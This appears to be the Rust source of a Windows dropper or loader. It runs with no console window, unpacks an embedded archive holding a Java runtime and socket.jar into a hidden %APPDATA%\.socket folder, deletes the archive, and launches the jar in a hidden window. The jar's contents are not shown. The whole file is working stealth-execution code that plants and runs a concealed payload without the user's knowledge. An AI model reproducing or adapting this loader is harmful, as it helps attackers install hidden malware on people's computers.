#![windows_subsystem = "windows"]
use std::env;
use std::ffi::OsStr;
use std::fs::{self, File};
use std::io;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use winapi::shared::minwindef::FALSE;
use winapi::um::fileapi::SetFileAttributesW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::{STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
use winapi::um::winuser::SW_HIDE;
use zip::ZipArchive;

fn main() -> io::Result<()> {
    let gbzip = include_bytes!("../socket.zip");
    let appdata_folder = env::var("APPDATA").unwrap();
    let socket_folder_path = format!("{}/.socket", appdata_folder);
    let socket_folder = Path::new(&socket_folder_path);

    if !socket_folder.exists() {
        fs::create_dir_all(&socket_folder).unwrap();
    }

    let zip_path = socket_folder.join("socket.zip");
    let mut zip_file = File::create(&zip_path).unwrap();
    zip_file.write_all(gbzip).unwrap();

    let zip_file = File::open(&zip_path)?;
    let mut archive = ZipArchive::new(zip_file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let outpath = socket_folder.join(file.mangled_name());

        if file.is_dir() {
            fs::create_dir_all(&outpath)?;
        } else {
            if let Some(parent) = outpath.parent() {
                if !parent.exists() {
                    fs::create_dir_all(&parent)?;
                }
            }
            let mut outfile = File::create(&outpath)?;
            io::copy(&mut file, &mut outfile)?;
        }
    }

    fs::remove_file(zip_path)?;

    let lp_file_name: Vec<u16> = OsStr::new(&socket_folder_path)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    unsafe {
        if SetFileAttributesW(lp_file_name.as_ptr(), FILE_ATTRIBUTE_HIDDEN) == 0 {
            eprintln!("Failed to set file attributes to hidden.");
        }
    }

    let java_exe_path = env::var("APPDATA").unwrap() + "\\.socket\\jre\\bin\\java.exe";
    let socket_jar_path = env::var("APPDATA").unwrap() + "\\.socket\\socket.jar";
    let command_line = format!("\"{}\" -jar \"{}\"", java_exe_path, socket_jar_path);
    let mut wide_command_line: Vec<u16> = OsStr::new(&command_line)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE as u16;

    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let _success = unsafe {
        CreateProcessW(
            std::ptr::null_mut(),
            wide_command_line.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            FALSE,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };

    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }

    Ok(())
}
